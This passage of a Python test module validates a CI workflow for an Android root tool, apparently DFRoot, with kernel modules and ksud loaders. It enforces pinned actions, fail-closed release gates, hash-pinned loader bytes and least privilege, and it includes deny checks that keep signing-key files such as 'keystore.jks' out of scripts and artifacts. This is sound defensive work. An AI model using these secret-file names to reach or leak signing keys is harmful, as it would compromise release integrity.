            raise AssertionError(f"CI KO policy gate is missing {fragment!r}")
    # No skip path in any gate: the only DFROOT_SKIP=ON uses are negative tests
    # inside `if ...; then` branches that exit non-zero.
    if ko_policy.count("-DDFROOT_SKIP=ON") != 2:
        raise AssertionError("CI KO policy must contain exactly two negative skip probes")
    for job_name, job in (("build-dfroot", ci), ("build-release", release)):
        cache_assert = run_script(named_step(job, CI_CACHE_ASSERT_STEP))
        if "find app/.cxx -type f -name CMakeCache.txt" not in cache_assert:
            raise AssertionError(f"{job_name} cache assertion must inspect every CMakeCache")
        if "'^DFROOT_SKIP_KO_HASH_CHECK:BOOL=OFF$'" not in cache_assert:
            raise AssertionError(f"{job_name} cache assertion must require skip=OFF")
        if 'if [ -z "$caches" ]' not in cache_assert or "exit 1" not in cache_assert:
            raise AssertionError(f"{job_name} cache assertion must fail closed on no caches")
    for job_name, job in ((HOST_GATES_JOB, host), ("build-dfroot", ci), ("build-release", release)):
        for step in steps(job):
            if job_name == HOST_GATES_JOB and step_property(step, "name") == KO_CI_POLICY_STEP:
                continue  # the only skip uses here are the two negative probes
            if "-DDFROOT_SKIP=ON" in run_script(step):
                raise AssertionError(
                    f"{job_name}/{step_property(step, 'name')} must not enable KO skip"
                )

    # 4. PR/branch/manual events upload licence evidence only: no APK and no
    # release claim. The Debug APK is a compile/content gate, not a product.
    if "WriteSigningProperties" in ci or ":app:assembleRelease" in ci:
        raise AssertionError("PR CI must not build a release variant or write signing material")
    if "WriteSigningProperties" in host or ":app:assembleRelease" in host:
        raise AssertionError("host-gates must not build a release variant or write signing material")
    release_action = "softprops/action-gh-release@" + ACTION_PINS["softprops/action-gh-release"][0]
    if any(step_property(step, "uses") == release_action for step in ci_steps):
        raise AssertionError("PR CI must never publish a release")
    ci_uploads = action_steps(ci, "actions/upload-artifact")
    if len(ci_uploads) != 1 or mapping(ci_uploads[0], "with", 8).get("name") != CI_EVIDENCE_ARTIFACT_NAME:
        raise AssertionError(f"PR CI must upload exactly one {CI_EVIDENCE_ARTIFACT_NAME} artifact")
    scope = run_script(named_step(ci, CI_SCOPE_STEP))
    if scope != DFROOT_RUN_SCRIPTS[CI_SCOPE_STEP]:
        raise AssertionError("CI scope report is not the pinned 'no release claim' text")
    for fragment in (
        "GITHUB_STEP_SUMMARY", "UNVERIFIED", "no release claim",
        "DFRoot-CI-evidence", "NO APK is distributed", "compile/content gate only",
    ):
        if fragment not in scope:
            raise AssertionError(f"CI scope report is missing {fragment!r}")
    assert_ci_evidence_upload_has_no_apk(text)

    # 5. build-release gates run in order, before any APK upload.
    ordered = [
        "Package signed release APK",
        EXTRACT_PINS_STEP,
        PACKAGED_KO_GATE_STEP,
        APK_LOADER_GATE_STEP,
        PROVENANCE_IDENTITY_STEP,
        CI_CACHE_ASSERT_STEP,
        RELEASE_EVIDENCE_STEP,
        UPLOAD_CHOKE_STEP,
        RELEASE_UPLOAD_STEP,
        PROVENANCE_GENERATE_STEP,
        PROVENANCE_UPLOAD_STEP,
    ]
    indices = [next(i for i, step in enumerate(release_steps) if step_property(step, "name") == name) for name in ordered]
    if indices != sorted(indices):
        raise AssertionError("build-release gates/upload are not in the required order")
    choke_index = indices[7]
    for upload in action_steps(release, "actions/upload-artifact"):
        if release_steps.index(upload) <= choke_index:
            raise AssertionError("no artifact may be uploaded before the evidence choke point")

    # 6. Packaged verifier is invoked for every staged APK, with manifest/SO
    # binding and stale-evidence invalidation.
    packaged = run_script(named_step(release, PACKAGED_KO_GATE_STEP))
    for fragment in (
        'APK_SOURCE=(release/DFRoot_*.apk)',
        'for apk in "${STAGED[@]}"',
        "unzip -q \"$apk\" 'lib/arm64-v8a/libdfroot.so' -d \"$EXTRACT\"",
        '-P app/src/main/jni/verify_packaged_ko.cmake',
        'rm -f "$PMAN" "${PMAN}.dfroot_ko.dump"',
        "unzip -Z1 \"$apk\" | grep -qx 'lib/arm64-v8a/libbootstrap.so'",
        "::error::APK $name is missing lib/arm64-v8a/libbootstrap.so",
        "^status: verified$",
        '"$man_so_sha" != "$so_sha"',
        '>> "$INDEX"',
        'echo "apk-gate-ok" > "$RUNNER_TEMP/marker-apk-gate"',
    ):
        if fragment not in packaged:
            raise AssertionError(f"packaged-KO gate is missing {fragment!r}")

    # 6b. The real loader verifier must run on entries extracted from every
    # staged APK, bound to the four reviewed pins from CMakeLists.txt.
    loader_gate = run_script(named_step(release, APK_LOADER_GATE_STEP))
    for fragment in (
        "-P app/src/main/jni/verify_loader_hashes.cmake",
        "grep -Fxc",
        'unzip -q "$apk"',
        "ksud_sha256",
        "ksud_size",
        "ksudnext_sha256",
        "ksudnext_size",
        '>> "$INDEX"',
        '^status: verified$',
    ):
        if fragment not in loader_gate:
            raise AssertionError(f"loader-byte gate is missing {fragment!r}")

    # 7. Provenance identity and per-APK release evidence.
    identity = run_script(named_step(release, PROVENANCE_IDENTITY_STEP))
    for fragment in ("git_head", "GITHUB_SHA", "android_variant", "ko_sha256", "marker-provenance-identity"):
        if fragment not in identity:
            raise AssertionError(f"provenance identity gate is missing {fragment!r}")
    evidence = run_script(named_step(release, RELEASE_EVIDENCE_STEP))
    for fragment in (
        '>> "$EVIDENCE"',
        '"$rows" -ne "$staged_count"',
        '"release/$name"',
        "marker-release-evidence",
        "dfroot-packaged-ko.manifest",
        "^status: verified$",
        "field so_sha256",
        'verified_so=$(field verified_so "$pman")',
        '*/app/build/intermediates/*/libdfroot.so)',
        "packaged_manifests",
        "in_pins \"$pkg_ko_hash\"",
        LOADER_PINS_FILE,
        APK_LOADER_GATE_INDEX,
        "loader-hashes.manifest",
        "loader_rows",
        "loader_ksud_sha256:",
        "loader_ksudnext_sha256:",
        "loader_manifest:",
    ):
        if fragment not in evidence:
            raise AssertionError(f"release evidence gate is missing {fragment!r}")

    # 8. The choke point checks every marker and the populated index before
    # the release upload becomes reachable.
    choke = run_script(named_step(release, UPLOAD_CHOKE_STEP))
    if '-s "$RUNNER_TEMP/$marker"' not in choke:
        raise AssertionError("choke point must check each marker with -s")
    for marker in RELEASE_GATE_MARKERS:
        if marker not in choke:
            raise AssertionError(f"choke point does not require {marker}")
    if f'RUNNER_TEMP/{RELEASE_GATE_INDEX}' not in choke:
        raise AssertionError("choke point does not require a populated APK gate index")
    if f'RUNNER_TEMP/{APK_LOADER_GATE_INDEX}' not in choke:
        raise AssertionError("choke point does not require a populated APK loader index")
    if "exit 1" not in choke:
        raise AssertionError("choke point must fail closed when evidence is missing")


def assert_release_scripts_do_not_reference_signing_files(text: str) -> None:
    """Only the cleanup step may mention the private signing files at all."""
    job = job_blocks(strip_yaml_comments(text))["build-release"]
    for step in steps(job):
        if step_property(step, "name") == CLEANUP_STEP:
            # Cleanup is skipped here only because its entire body is locked to
            # the exact rm command by assert_exact_release_run_scripts; it is
            # not a free-form exempt script.
            continue
        script = run_script(step).lower()
        for forbidden in ("keystore.jks", "signing.properties"):
            if forbidden in script:
                raise AssertionError(
                    f"build-release step {step_property(step, 'name')!r} run script "
                    f"must not reference {forbidden!r}"
                )


def assert_safe_artifact_entries(field: str, value: str | None) -> None:
    """Reject secret-bearing or path-traversing artifact entries explicitly."""
    if value is None:
        raise AssertionError(f"artifact {field} is missing")
    for entry in value.splitlines():
        lowered = entry.strip().lower()
        for token in FORBIDDEN_ARTIFACT_TOKENS:
            if token in lowered:
                raise AssertionError(
                    f"artifact {field} entry {entry!r} must not contain {token!r}"
                )


def assert_exact_artifact_inputs(text: str) -> None:
    """Upload paths and the release publish files are exact, closed allowlists."""
    jobs = job_blocks(strip_yaml_comments(text))
    expected_uploads = {
        "build-lkms": {UPLOAD_ARTIFACT_NAMES["build-lkms"][0]: LKM_UPLOAD_PATH},
        "build-dfroot": {CI_EVIDENCE_ARTIFACT_NAME: CI_EVIDENCE_UPLOAD_PATH},
        "build-release": {
            RELEASE_ARTIFACT_NAME: RELEASE_UPLOAD_PATH,
            PROVENANCE_ARTIFACT_NAME: PROVENANCE_UPLOAD_PATH,
        },
    }
    for job_name, expected_by_name in expected_uploads.items():
        uploads = action_steps(jobs[job_name], "actions/upload-artifact")
        actual_names = tuple(mapping(upload, "with", 8).get("name") for upload in uploads)
        if actual_names != UPLOAD_ARTIFACT_NAMES[job_name]:
            raise AssertionError(
                f"{job_name} upload artifact names must be exactly "
                f"{UPLOAD_ARTIFACT_NAMES[job_name]!r}, got {actual_names!r}"
            )
        for upload in uploads:
            name = mapping(upload, "with", 8).get("name")
            path = mapping(upload, "with", 8).get("path")
            assert_safe_artifact_entries("path", path)
            if path != expected_by_name[name]:
                raise AssertionError(
                    f"{job_name}/{name} upload path must be exactly "
                    f"{expected_by_name[name]!r}, got {path!r}"
                )
    releases = action_steps(jobs["publish"], "softprops/action-gh-release")
    if len(releases) != 1:
        raise AssertionError("publish must have exactly one gh-release step")
    files = mapping(releases[0], "with", 8).get("files")
    assert_safe_artifact_entries("files", files)
    if files != PUBLISH_FILES:
        raise AssertionError(f"publish files must be exactly {PUBLISH_FILES!r}, got {files!r}")


def validate_workflow(text: str) -> None:
    assert_strict_yaml(text)
    assert_no_continue_on_error(text)
    assert_no_secrets_bypass(text)
    assert_exact_test_ci_commands(text)
    assert_exact_step_names(text)
    assert_job_graph(text)
    assert_exact_release_run_scripts(text)
    assert_exact_dfroot_run_scripts(text)
    assert_exact_host_gates_run_scripts(text)
    assert_six_cmake_suites(text)
    assert_pr3_gates(text)
    assert_required_steps_unskippable(text)
    assert_exact_command_lines(text)
    assert_release_scripts_do_not_reference_signing_files(text)
    assert_exact_artifact_inputs(text)
    assert_ci_evidence_upload_has_no_apk(text)
    assert_exact_triggers(text)
    assert_ddk_image_digest(text)


# --------------------------------------------------------------------------- #
# Shell fixture helpers for behavioral tests
# --------------------------------------------------------------------------- #
def run_in_dir(script: str, cwd: Path, env_overrides: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    script_path = cwd / "_extracted_script.sh"
    script_path.write_text(script.rstrip() + "\n", encoding="utf-8")
    env = os.environ.copy()
    env.update(env_overrides or {})
    return subprocess.run(
        ["bash", str(script_path)],
        cwd=cwd,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def write_release_apks(root: Path, names: list[str]) -> Path:
    base = root / "app" / "build" / "outputs" / "apk" / "release"
    base.mkdir(parents=True, exist_ok=True)
    for name in names:
        (base / name).write_bytes(f"APK:{name}\n".encode())
    return base


def write_debug_apks(root: Path, names: list[str], with_bootstrap: bool = True) -> Path:
    """Harmless ZIP fixtures whose native lib set mirrors a real debug APK."""
    base = root / "app" / "build" / "outputs" / "apk" / "debug"
    base.mkdir(parents=True, exist_ok=True)
    for name in names:
        with zipfile.ZipFile(base / name, "w") as zf:
            zf.writestr("classes.dex", f"DEBUG:{name}\n".encode())
            if with_bootstrap:
                zf.writestr("lib/arm64-v8a/libbootstrap.so", b"harmless bootstrap fixture\n")
    return base


def write_dist(root: Path, names: list[str]) -> Path:
    dist = root / "dist"
    dist.mkdir(parents=True, exist_ok=True)
    for name in names:
        data = f"APK:{name}\n".encode()
        (dist / name).write_bytes(data)
        digest = hashlib.sha256(data).hexdigest()
        (dist / (name + ".sha256")).write_text(f"{digest}  {name}\n", encoding="utf-8")
    return dist


def write_license_assets(root: Path) -> dict[str, bytes]:
    """Create the four licence/notice source files at the checkout root."""
    contents = {name: f"{name} fixture content\n".encode() for name in LICENSE_ASSETS}
    for name, data in contents.items():
        (root / name).write_bytes(data)
    return contents


def make_fake_sdk(root: Path, exit_code: int) -> tuple[Path, Path]:
    sdk = root / "sdk"
    tool = sdk / "build-tools" / "35.0.0" / "apksigner"
    tool.parent.mkdir(parents=True, exist_ok=True)
    log = root / "apksigner-invocations.txt"
    tool.write_text(
        "#!/usr/bin/env bash\n"
        "set -u\n"
        'printf "%s\\n" "$@" > "$APKSIGNER_LOG"\n'
        f"exit {exit_code}\n",
        encoding="utf-8",
    )
    tool.chmod(0o755)
    return sdk, log


# Harmless fixture bytes for the bundled-loader gate. No loader is executed and
# no privileged/private content is used; the tampered blob has the SAME size as
# the good one so only its SHA-256 can reject it.
LOADER_KSUD_ENTRY = "lib/arm64-v8a/libksud.so"
LOADER_NEXT_ENTRY = "lib/arm64-v8a/libksudnext.so"
LOADER_KSUD_BYTES = b"HARMLESS-KSUD-FIXTURE-bytes-0000000000000000\n"
LOADER_NEXT_BYTES = b"HARMLESS-NEXT-FIXTURE-bytes-1111111111111111\n"
LOADER_TAMPERED_KSUD_BYTES = b"HARMLESS-KSUD-FIXTURE-bytes-9999999999999999\n"


def write_loader_gate_fixture(
    root: Path,
    mode: str = "good",
    apk_name: str = "DFRoot_loader.apk",
    pin_overrides: dict[str, str] | None = None,
) -> dict[str, str]:
    """Build a synthetic checkout for the real loader gate script.

    Includes a fixture CMakeLists.txt with the four pins, a copy of the real
    verify_loader_hashes.cmake, and a deterministic (fixed-timestamp) stored ZIP
    with harmless bytes at the two exact arm64 loader paths plus bootstrap.
    """
    assert len(LOADER_KSUD_BYTES) == len(LOADER_TAMPERED_KSUD_BYTES)
    jni = root / "app/src/main/jni"
    jni.mkdir(parents=True, exist_ok=True)
    (jni / "verify_loader_hashes.cmake").write_bytes(
        (ROOT / "app/src/main/jni/verify_loader_hashes.cmake").read_bytes()
    )
    pins = {
        "ksud_sha256": hashlib.sha256(LOADER_KSUD_BYTES).hexdigest(),
        "ksud_size": str(len(LOADER_KSUD_BYTES)),
        "ksudnext_sha256": hashlib.sha256(LOADER_NEXT_BYTES).hexdigest(),
        "ksudnext_size": str(len(LOADER_NEXT_BYTES)),
    }
    if pin_overrides:
        pins.update(pin_overrides)
    (jni / "CMakeLists.txt").write_text(
        f'set(LOADER_KSUD_SHA256 "{pins["ksud_sha256"]}")\n'
        f'set(LOADER_KSUD_SIZE {pins["ksud_size"]})\n'
        f'set(LOADER_KSUDNEXT_SHA256 "{pins["ksudnext_sha256"]}")\n'
        f'set(LOADER_KSUDNEXT_SIZE {pins["ksudnext_size"]})\n',
        encoding="utf-8",
    )
    ksud_bytes = LOADER_TAMPERED_KSUD_BYTES if mode == "tampered" else LOADER_KSUD_BYTES
    entries = [
        (LOADER_KSUD_ENTRY, ksud_bytes),
        (LOADER_NEXT_ENTRY, LOADER_NEXT_BYTES),
        ("lib/arm64-v8a/libbootstrap.so", b"harmless bootstrap fixture\n"),
    ]
    if mode == "missing":
        entries = [(n, d) for n, d in entries if n != LOADER_KSUD_ENTRY]
    if mode == "wrong-abi":
        entries = [
            ("lib/x86/libksud.so" if n == LOADER_KSUD_ENTRY else n, d) for n, d in entries
        ]
    release = root / "release"
    release.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(release / apk_name, "w") as zf:
        for name, data in entries:
            info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_STORED
            info.external_attr = (0o100644 << 16)
            zf.writestr(info, data)
    return pins


class WorkflowPolicyTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.raw = WORKFLOW.read_text(encoding="utf-8")
        validate_workflow(cls.raw)
        cls.active = strip_yaml_comments(cls.raw)
        cls.jobs = job_blocks(cls.active)

    def test_strict_yaml_allowlist_accepts_the_workflow(self) -> None:
        self.assertEqual(strict_violations(self.raw), [])

    def test_signing_smoke_is_compatible_with_fail_closed_release(self) -> None:
        """The required smoke must not rely on a placeholder KO or emit an
        unsigned release: PR #3 disables that variant and pins KO bytes.
        """
        smoke = (ROOT / "tests" / "signing" / "smoke_signed_release.sh").read_text(encoding="utf-8")
        gradle = (ROOT / "app" / "build.gradle.kts").read_text(encoding="utf-8")
        self.assertIn("-Pdfroot.signingSmokeSkipNative=true", smoke)
        self.assertIn("dfroot.signingSmokeSkipNative", gradle)
        self.assertNotIn("disposable placeholder KO", smoke)
        self.assertNotIn("dfroot-android13-5.15.ko", smoke)
        self.assertNotIn("unsigned-apksigner.log", smoke)
        self.assertIn("no release APK was produced", smoke)
        self.assertIn("if ./gradlew :app:clean :app:assembleRelease", smoke)
        assert_smoke_identity(gradle, smoke)

    def test_signing_smoke_identity_is_isolated_from_production(self) -> None:
        """The smoke APK can never be a production-named DFRoot_*.apk."""
        smoke = (ROOT / "tests" / "signing" / "smoke_signed_release.sh").read_text(encoding="utf-8")
        gradle = (ROOT / "app" / "build.gradle.kts").read_text(encoding="utf-8")
        assert_smoke_identity(gradle, smoke)
        self.assertIn("-Pdfroot.signingSmokeSkipNative=true", smoke)
        self.assertNotIn("SIGNED_APK=app/build/outputs/apk/release/DFRoot_", smoke)
        for fragment in (
            "df.root.signingsmoke", "4.8-gzif-signingsmoke",
            "SigningSmoke-${vn}.apk", "DFRoot_${vn}.apk",
        ):
            with self.subTest(fragment=fragment):
                self.assertIn(fragment, gradle)
        self.assertIn("SigningSmoke-4.8-gzif-signingsmoke.apk", smoke)

    def test_gradle_exempts_both_reviewed_loader_blobs_from_jni_stripping(self) -> None:
        """Both reviewed JNI loaders stay byte-identical to their CMake pins."""
        gradle = (ROOT / "app" / "build.gradle.kts").read_text(encoding="utf-8")
        assert_loader_keep_debug_symbols(gradle)

    def test_top_level_triggers_are_an_exact_allowlist(self) -> None:
        assert_exact_triggers(self.raw)
        self.assertEqual(parse_triggers(self.raw), EXPECTED_TRIGGERS)
        self.assertNotIn("pull_request_target", parse_triggers(self.raw))
        triggers = parse_triggers(self.raw)
        self.assertEqual(triggers["push"], {"branches": ["master", "main"], "tags": ["v*"]})
        self.assertEqual(triggers["pull_request"], {"branches": ["master", "main"]})
        self.assertEqual(triggers["workflow_dispatch"], {})

    def test_ddk_image_digest_is_an_exact_constant(self) -> None:
        assert_ddk_image_digest(self.raw)
        image = mapping(self.jobs["build-lkms"], "container", 4).get("image", "")
        self.assertEqual(
            image,
            "ghcr.io/ylarod/ddk-min:${{ matrix.kmi }}-20260828@sha256:" + DDK_IMAGE_DIGEST,
        )
        self.assertEqual(image.split("@sha256:", 1)[1], DDK_IMAGE_DIGEST)

    def test_top_level_default_and_explicit_job_permissions_are_least_privilege(self) -> None:
        self.assertEqual(mapping(self.active, "permissions", 0), {"contents": "read"})
        self.assertTrue(self.jobs, "no jobs found")
        for name, job in self.jobs.items():
            with self.subTest(job=name):
                expected = {"contents": "write", "actions": "read"} if name == "publish" else {"contents": "read"}
                if name == "build-release":
                    expected["actions"] = "read"
                self.assertEqual(mapping(job, "permissions", 4), expected)

    def test_every_action_is_exactly_pinned_with_a_version_comment(self) -> None:
        uses_lines = re.findall(r"^\s*(?:-\s+)?uses:\s*(\S+)(?:\s+#\s*(v\d+))?\s*$", self.raw, re.MULTILINE)
        self.assertTrue(uses_lines, "no action steps found")
        for uses, version in uses_lines:
            with self.subTest(uses=uses):
                self.assertIn("@", uses)
                action, sha = uses.rsplit("@", 1)
                self.assertIn(action, ACTION_PINS)
                self.assertEqual((sha, version), ACTION_PINS[action])
                self.assertRegex(sha, r"^[0-9a-f]{40}$")
        active_uses = re.findall(r"^\s*(?:-\s+)?uses:\s*(\S+)\s*$", self.active, re.MULTILINE)
        self.assertEqual(active_uses, [uses for uses, _ in uses_lines])

    def test_every_checkout_disables_persisted_credentials(self) -> None:
        checkouts = [step for job in self.jobs.values() for step in action_steps(job, "actions/checkout")]
        self.assertTrue(checkouts, "no checkout steps found")
        for checkout in checkouts:
            with self.subTest(step=step_property(checkout, "name")):
                self.assertEqual(mapping(checkout, "with", 8).get("persist-credentials"), "false")

    def test_signing_secrets_are_confined_to_the_protected_release_step(self) -> None:
        assert_no_secrets_bypass(self.raw)
        for name, job in self.jobs.items():
            with self.subTest(job=name):
                references = re.findall(r"\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}", job)
                if name == "build-release":
                    self.assertEqual(set(references), SIGNING_SECRETS)
                else:
                    self.assertEqual(references, [])

    def test_tag_gates_and_non_cancelling_release_concurrency_are_exact(self) -> None:
        expected_gate = "${{ " + TAG_PUSH + " }}"
        self.assertEqual(property_value(self.jobs["build-release"], "if", 4), expected_gate)
        self.assertEqual(property_value(self.jobs["publish"], "if", 4), expected_gate)
        self.assertEqual(
            property_value(self.jobs["build-dfroot"], "if", 4),
            "${{ !(" + TAG_PUSH + ") }}",
        )
        self.assertEqual(
            mapping(self.active, "concurrency", 0).get("cancel-in-progress"),
            "${{ !startsWith(github.ref, 'refs/tags/v') }}",
        )

    def test_job_graph_is_unconditional_host_gates_then_both_build_paths(self) -> None:
        assert_job_graph(self.raw)
        host = self.jobs[HOST_GATES_JOB]
        self.assertIsNone(property_value(host, "if", 4))
        self.assertEqual(property_value(host, "needs", 4), "build-lkms")
        self.assertEqual(property_value(self.jobs["build-dfroot"], "needs", 4), HOST_GATES_JOB)
        self.assertEqual(property_value(self.jobs["build-release"], "needs", 4), HOST_GATES_JOB)
        self.assertEqual(property_value(self.jobs["publish"], "needs", 4), "build-release")
        self.assertEqual(mapping(host, "permissions", 4), {"contents": "read"})
        checkout = action_steps(host, "actions/checkout")[0]
        self.assertEqual(mapping(checkout, "with", 8).get("persist-credentials"), "false")

    def test_host_gates_carry_all_host_suites_and_the_checkout_sha_assertion(self) -> None:
        assert_exact_host_gates_run_scripts(self.raw)
        assert_six_cmake_suites(self.raw)
        host = self.jobs[HOST_GATES_JOB]
        script = run_script(named_step(host, CHECKOUT_SHA_STEP))
        self.assertEqual(script, CHECKOUT_SHA_SCRIPT)
        self.assertIn("git rev-parse 'HEAD^{commit}'", script)
        self.assertIn('if [ "$head" != "$GITHUB_SHA" ]', script)
        self.assertIn('./gradlew :app:testDebugUnitTest', "\n".join(
            run_script(step) for step in steps(host)
        ))

    def test_test_ci_precedes_and_gates_ddk_and_runs_all_fast_checks(self) -> None:
        names = list(self.jobs)
        self.assertLess(names.index("test-ci"), names.index("build-lkms"))
        self.assertEqual(property_value(self.jobs["build-lkms"], "needs", 4), "test-ci")
        job = self.jobs["test-ci"]
        self.assertEqual(len(action_steps(job, "actions/checkout")), 1)
        java = action_steps(job, "actions/setup-java")
        self.assertEqual(len(java), 1)
        self.assertEqual(mapping(java[0], "with", 8), {"distribution": "temurin", "java-version": "21"})
        self.assertEqual(len(action_steps(job, "gradle/actions/setup-gradle")), 1)
        assert_exact_test_ci_commands(self.raw)

    def test_no_continue_on_error_and_no_tolerated_required_steps(self) -> None:
        assert_no_continue_on_error(self.raw)
        assert_required_steps_unskippable(self.raw)

    def test_every_job_matches_the_exact_ordered_step_allowlist(self) -> None:
        assert_exact_step_names(self.raw)
        for job_name, expected in JOB_STEP_NAMES.items():
            with self.subTest(job=job_name):
                actual = [step_property(step, "name") for step in steps(self.jobs[job_name])]
                self.assertEqual(actual, expected)

    def test_every_build_release_run_script_is_exact_and_ordered(self) -> None:
        """The full ordered run-script map, cleanup included, is equality-locked."""
        assert_exact_release_run_scripts(self.raw)
        job = self.jobs["build-release"]
        run_steps = [step for step in steps(job) if step_property(step, "run") is not None]
        self.assertEqual(
            [step_property(step, "name") for step in run_steps],
            list(RELEASE_RUN_SCRIPTS),
        )
        for name, step in zip(RELEASE_RUN_SCRIPTS, run_steps):
            with self.subTest(step=name):
                self.assertEqual(run_script(step), RELEASE_RUN_SCRIPTS[name])
        self.assertEqual(
            run_script(named_step(job, CLEANUP_STEP)),
            "rm -f -- signing.properties keystore.jks .keystore.jks-*.tmp .signing.properties-*.tmp",
        )

    def test_release_run_scripts_never_expose_signing_files(self) -> None:
        assert_release_scripts_do_not_reference_signing_files(self.raw)
        mentions = []
        for step in steps(self.jobs["build-release"]):
            script = run_script(step).lower()
            if "keystore.jks" in script or "signing.properties" in script:
                mentions.append(step_property(step, "name"))
        self.assertEqual(mentions, [CLEANUP_STEP])

    def test_artifact_inputs_are_exact_and_free_of_signing_paths(self) -> None:
        assert_exact_artifact_inputs(self.raw)
        for token in FORBIDDEN_ARTIFACT_TOKENS:
            with self.subTest(token=token):
                self.assertNotIn(token, RELEASE_UPLOAD_PATH.lower())
                self.assertNotIn(token, PUBLISH_FILES.lower())
                self.assertNotIn(token, CI_EVIDENCE_UPLOAD_PATH.lower())

    def test_gpl_license_text_is_sha256_pinned(self) -> None:
        """GPL-3.0.txt must remain the verbatim official GPLv3 text."""
        data = (ROOT / "GPL-3.0.txt").read_bytes()
        self.assertEqual(hashlib.sha256(data).hexdigest(), GPL_SHA256)
        self.assertIn(b"GNU GENERAL PUBLIC LICENSE", data)
        self.assertIn(b"Version 3, 29 June 2007", data)

    def test_repository_license_text_is_sha256_pinned(self) -> None:
        """LICENSE must remain the repository's verbatim GPL-2.0 text."""
        data = (ROOT / "LICENSE").read_bytes()
        self.assertEqual(hashlib.sha256(data).hexdigest(), LICENSE_SHA256)
        self.assertIn(b"GNU GENERAL PUBLIC LICENSE", data)
        self.assertIn(b"Version 2, June 1991", data)

    def test_ci_evidence_bundle_conveys_all_notices_and_no_apk(self) -> None:
        """The public CI evidence bundle is exactly the licence/notice set."""
        ci_entries = CI_EVIDENCE_UPLOAD_PATH.splitlines()
        self.assertEqual(ci_entries, list(LICENSE_ASSETS))
        self.assertFalse(any(".apk" in entry.lower() for entry in ci_entries))
        self.assertFalse(any("outputs" in entry.lower() for entry in ci_entries))
        for asset in LICENSE_ASSETS:
            with self.subTest(asset=asset):
                self.assertIn(asset, ci_entries)
                self.assertTrue((ROOT / asset).is_file(), f"missing source asset {asset}")
                self.assertGreater((ROOT / asset).stat().st_size, 0)
        assert_safe_artifact_entries("path", CI_EVIDENCE_UPLOAD_PATH)
        assert_ci_evidence_upload_has_no_apk(self.raw)

    def test_license_and_notice_assets_are_exact_release_allowlist(self) -> None:
        """Each licence asset is packaged, uploaded and published by name."""
        for asset in LICENSE_ASSETS:
            with self.subTest(asset=asset):
                self.assertIn("cp -- " + " ".join(LICENSE_ASSETS) + " release/", PACKAGE_SIGNED_SCRIPT)
                self.assertIn("release/" + asset, RELEASE_UPLOAD_PATH.splitlines())
                self.assertIn("dist/" + asset, PUBLISH_FILES.splitlines())
                self.assertTrue((ROOT / asset).is_file(), f"missing source asset {asset}")
                self.assertGreater((ROOT / asset).stat().st_size, 0)
        # The allowlists remain closed: no asset outside the exact set is added.
        # The signed allowlists list LICENSE before GPL-3.0.txt while the CI path
        # lists it after, so compare the asset sets rather than their order; the
        # full strings are equality-locked against the workflow elsewhere.
        self.assertEqual(
            sorted(line.removeprefix("release/") for line in RELEASE_UPLOAD_PATH.splitlines()[2:]),
            sorted(LICENSE_ASSETS),
        )
        self.assertEqual(
            sorted(line.removeprefix("dist/") for line in PUBLISH_FILES.splitlines()[2:]),
            sorted(LICENSE_ASSETS),
        )

    def test_ddk_stays_digest_pinned_non_privileged_and_uploads_one_ko(self) -> None:
        job = self.jobs["build-lkms"]
        image = mapping(job, "container", 4).get("image", "")
        self.assertRegex(image, r"@sha256:[0-9a-f]{64}$")
        self.assertEqual(image.split("@sha256:", 1)[1], DDK_IMAGE_DIGEST)
        self.assertNotIn("--privileged", self.active)
        upload = action_steps(job, "actions/upload-artifact")
        self.assertEqual(len(upload), 1)
        inputs = mapping(upload[0], "with", 8)
        self.assertEqual(inputs.get("path"), "out/dfroot-${{ matrix.kmi }}.ko")
        self.assertEqual(inputs.get("if-no-files-found"), "error")
        self.assertEqual(inputs.get("overwrite"), "true")

    def test_ci_build_is_read_only_builds_debug_only_and_uploads_evidence(self) -> None:
        job = self.jobs["build-dfroot"]
        self.assertEqual(property_value(job, "name", 4), "CI DFRoot evidence gates")
        self.assertEqual(property_value(job, "needs", 4), HOST_GATES_JOB)
        self.assertEqual(len(action_steps(job, "actions/checkout")), 1)
        self.assertEqual(len(action_steps(job, "actions/setup-java")), 1)
        self.assertEqual(len(action_steps(job, "gradle/actions/setup-gradle")), 1)
        download = action_steps(job, "actions/download-artifact")
        self.assertEqual(len(download), 1)
        self.assertEqual(mapping(download[0], "with", 8).get("name"), "df-lkm-android13-5.15")
        builds = [run_script(step) for step in steps(job) if "./gradlew" in run_script(step)]
        self.assertEqual(len(builds), 1)  # Debug compile/content gate only
        self.assertIn("./gradlew :app:assembleDebug", builds[0])
        self.assertNotIn(":app:testDebugUnitTest", "\n".join(builds))
        self.assertNotIn(":app:assembleRelease", "\n".join(builds))
        self.assertNotIn("WriteSigningProperties", job)

        job_steps = steps(job)
        counter = named_step(job, APK_COUNTER_COMMAND)
        upload = action_steps(job, "actions/upload-artifact")
        self.assertEqual(len(upload), 1)
        self.assertLess(job_steps.index(counter), job_steps.index(upload[0]))
        self.assertIn("shopt -s nullglob", run_script(counter))
        self.assertIn("${#debug[@]} -ne 1", run_script(counter))
        self.assertNotIn("release=", run_script(counter))
        inputs = mapping(upload[0], "with", 8)
        self.assertEqual(inputs.get("name"), CI_EVIDENCE_ARTIFACT_NAME)
        self.assertEqual(inputs.get("path"), CI_EVIDENCE_UPLOAD_PATH)
        self.assertEqual(inputs.get("if-no-files-found"), "error")
        self.assertEqual(inputs.get("overwrite"), "true")
        assert_ci_evidence_upload_has_no_apk(self.raw)
        self.assertNotIn(".apk", CI_EVIDENCE_UPLOAD_PATH.lower())

    def test_release_checks_ancestry_before_referencing_any_signing_secret(self) -> None:
        self.assertIn("# Fail before any signing secret is referenced.", self.raw)
        job = self.jobs["build-release"]
        self.assertEqual(property_value(job, "needs", 4), HOST_GATES_JOB)
        self.assertEqual(property_value(job, "environment", 4), "release")
        checkout = action_steps(job, "actions/checkout")
        self.assertEqual(len(checkout), 1)
        self.assertEqual(mapping(checkout[0], "with", 8).get("fetch-depth"), "0")
        job_steps = steps(job)
        # Exact equality, not a substring search: an `echo` carrying the
        # ancestry command as text or an `|| true` suffix cannot satisfy this.
        assert_exact_release_run_scripts(self.raw)
        ancestry_step = named_step(job, ANCESTRY_STEP)
        self.assertEqual(run_script(ancestry_step), ANCESTRY_SCRIPT)
